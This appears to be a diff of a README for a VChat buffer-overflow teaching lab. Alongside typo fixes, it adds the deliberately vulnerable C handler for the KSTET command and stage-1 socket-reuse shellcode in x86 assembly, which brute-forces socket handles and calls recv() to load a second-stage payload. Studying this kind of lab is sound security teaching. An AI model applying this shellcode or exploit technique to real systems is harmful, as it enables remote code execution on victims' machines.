@@ -56,11 +56,11 @@ This is particularly useful in environment with constraints and limited resource
    * Exit with ```CTL+]```
    * An example is shown below
 
-		![Telent](Images/Telnet.png)
+		![Telnet](Images/Telnet.png)
 
 4. **Linux**: We can try a few inputs to the *KSTET* command, and see if we can get any information. Simply type *KSTET* followed by some additional input as shown below
 
-	![Telent](Images/Telnet2.png)
+	![Telnet](Images/Telnet2.png)
 
 	* Now, trying every possible combinations of strings would get quite tiresome, so we can use the technique of *fuzzing* to automate this process as discussed later in the exploitation section.
 	* In this case we will do some fuzzing to keep the exploit sections relatively consistent, but as you can see we know crashing this command will not take much!
@@ -146,8 +146,8 @@ SPIKE is a C based fuzzing tool that is commonly used by professionals, it is av
 
 	<img src="Images/I4c.png" width=600>
 
-	* We can further see that VChat crashes once it recives sixty `A`s
-7. We can see at the bottom of *Immunity Debugger* that VChat crashed due to a memory access violation. This means we likely overwrote the return address stored on the stack, leading to the EIP being loaded with an invalid address, this error could have also been caused if we overwrote a local pointer that is then derefernced... However, we know from previous exploits on VChat this is unlikely.
+	* We can further see that VChat crashes once it receives sixty `A`s
+7. We can see at the bottom of *Immunity Debugger* that VChat crashed due to a memory access violation. This means we likely overwrote the return address stored on the stack, leading to the EIP being loaded with an invalid address, this error could have also been caused if we overwrote a local pointer that is then dereferenced... However, we know from previous exploits on VChat this is unlikely.
 
 	<img src="Images/I4d.png" width=600>
 
@@ -331,7 +331,7 @@ Due to the limited space on the stack we have to work with (66 bytes) we will be
 
 		<img src="Images/I28.png" width=600>
 
-	3. Make a Telenet Connection 
+	3. Make a Telnet Connection 
 
 		<img src="Images/I29.png" width=600>
 
@@ -401,7 +401,7 @@ Due to the limited space on the stack we have to work with (66 bytes) we will be
 
 		<img src="Images/I33.png" width=800>
 
-	2. Launch the [exploit5.py](./SourceCode/exploit5.py) attack. Once you have stepped through the `jmp esp` and the short `jmp` you should see the following in your dissasembler.
+	2. Launch the [exploit5.py](./SourceCode/exploit5.py) attack. Once you have stepped through the `jmp esp` and the short `jmp` you should see the following in your disassembler.
 
 		<img src="Images/I34.png" width=800>
 
@@ -436,9 +436,68 @@ When the exploit does work, you will need to exit out of the `cmd` window manual
 
 <img src="Images/I37.png" width=800>
 
-## VChat Code
-**To Be Added**
+## VChat and Exploit Code
 
+### VChat Code
+As with the previous exploits the VChat code is relatively simple in nature. Once a connection is received on port 9999, a thread is created running the  `DWORD WINAPI ConnectionHandler(LPVOID cli)` function, where `LPVOID cli` is a void pointer that holds the address of a `client_t` structure; this is a custom structure that contains the necessary connection information.  
+
+
+Below is the code segment that handles the `KSTET` message type. 
+```c
+else if (strncmp(RecvBuf, "KSTET ", 6) == 0) {
+	char* KstetBuf = malloc(100);
+	strncpy(KstetBuf, RecvBuf, 100);
+	memset(RecvBuf, 0, DEFAULT_BUFLEN);
+	Function2(KstetBuf);
+	SendResult = send(Client, "KSTET SUCCESSFUL\n", 17, 0);
+}
+```
+The buffer we copy to is only 100 bytes, and by using the [`strncpy(char * destination, const char * source, size_t num )`](https://cplusplus.com/reference/cstring/strncpy/) function, we guarantee we will only copy 100 bytes from the source into the destination buffer. This prevents buffer overflows as we limit the number of character copied not by the size of the source, but based on something we specify. Then to prevent malicious code from existing in memory, as the original Vulnserver did not free the receiving buffer the line `memset(RecvBuf, 0, DEFAULT_BUFLEN);` zeros out the receiving buffer. Then the code calls `Function2(...)`; this is where the overflow occurs. 
+
+```c
+void Function2(char* Input) {
+	char Buffer2S[60];
+	strcpy(Buffer2S, Input);
+}
+```
+
+Within `Function2(char* input)` we copy the buffer that possibly contains 100 bytes, into a locally declared buffer that has 60 bytes of space allocated. As we use the [`strcpy(char * destination, const char * source)`](https://cplusplus.com/reference/cstring/strcpy/) function, this copies from the source (100 bytes) to the destination buffer (60 bytes) until a null terminator is detected in the source buffer.
+
+### Shellcode
+The resulting shellcode is shown below:
+```s
+sub esp,0x64            ; Move ESP pointer above our initial buffer to avoid
+						; overwriting our shellcode
+xor edi,edi             ; Zero out EDI (Anything XORed with itself is 0)
+socket_loop:            ; Brute Force Loop Label
+xor ebx,ebx             ; Zero out EBX (Anything XORed with itself is 0)
+push ebx                ; Push 'flags' parameter = 0 
+add bh,0x4              ; Make EBX = 0x00000400 which is  1024 bytes
+push ebx                ; Push `len` parameter, this is 1024 bytes
+mov ebx,esp             ; Move the current pointer of ESP into EBX
+add ebx,0x64            ; Point EBX the original ESP to make it the pointer to
+						; where our stage-2 payload will be received
+push ebx                ; Push `*buf` parameter = Pointer to ESP+0x64
+inc edi                 ; Make EDI = EDI + 1
+push edi                ; Push socket handle `s` parameter = EDI, For each loop we increment EDI
+mov eax,0x74F123A0      ; We need to make EAX = 0x74F123A0 but we can't inject if there are null bytes in this.
+                        ; Since there are none we do not need to do any shifting
+call eax                ; Call recv()
+test eax,eax            ; Check if our recv() call was successfully made
+jnz socket_loop         ; If recv() failed, jump back to the socket loop where
+						; EDI will be increased to check the next socket handle
+```
+
+We first adjust the stack pointer that is stored in the `ESP` register: `sub esp,0x64`. This is done to prevent the function calls from overwriting our shell code.
+
+
+The `EDI` register will be used to store our Socket Handle; this is simply an integer value. Since we are brute forcing this we need to start at zero. We achieve this with the following instruction: `xor edi,edi`. By XORing a value with itself we achieve the value of zero.
+
+
+Following this we have a label `socket_loop:`. This is used to create the loop by giving us a way to *easily* jump backwards in the code. 
+
+
+Next we configure the stack for a call to the `recv(...)` function; Remember that we place the arguments onto the stack in reverse order. First we zero out a register with the following instruction: `xor ebx,ebx`. This is done so we can place a zero onto the stack for the *Flag* argument with the instruction: `push ebx`. Then we add 0x4 to the *bh* register: `add bh,0x4`, this is done so the `EBX` register which was zero now contains the value 1024. This is because we place the value `0x4` into the *high* registers (bytes 8 - 15) of the `EBX` register. The value 1024 is placed onto the stack again with the push instruction: `push ebx`.  The instructions `mov ebx,esp` and `add ebx,0x64` setup the location we will write the received data to, in this case we  we load the stack pointer into the `EBX` register, and sets it to the original `ESP` location before the initial subtraction; This is so the received second stage will be written to a nearby location. This is added to the stack with the instruction `push ebx`. The final parameter is configured with the instructions `inc edi` and `push edi`; the `inc edi` is used for our brute forcing of the Socket Handle and `push edi` places it onto the stack. Finally we make the call to the `recv(...)` function using `mov eax,0x74F123A0` by moving the address of `recv(...)` and using `call eax` call the function. We then check if the function succeeded using `test eax,eax` and if the returned value is not zero `jnz socket_loop` we repeat the loop; otherwise we fall through into the stage-2 shellcode we wrote to the stack with our `recv(...)` call.  
 
 
 ## Test code
@@ -461,5 +520,5 @@ mov eax,0x40252C90      ; We need to make EAX = 0040252C but we can't inject
 shr eax,0x8             ; Remove the '90' byte of EAX by shifting right and
                         ; This makes EAX = 0040252C
 ```
-* `mov eax,0x40252C90`: Put the address of the `recv(...)` function into *eax*, this contains `0x90` as the orignal `0x0040252C` has null bytes.
+* `mov eax,0x40252C90`: Put the address of the `recv(...)` function into *eax*, this contains `0x90` as the original `0x0040252C` has null bytes.
 * `shr eax,0x8`: Shifts the eax register right 8 bits to add the leading null byte.
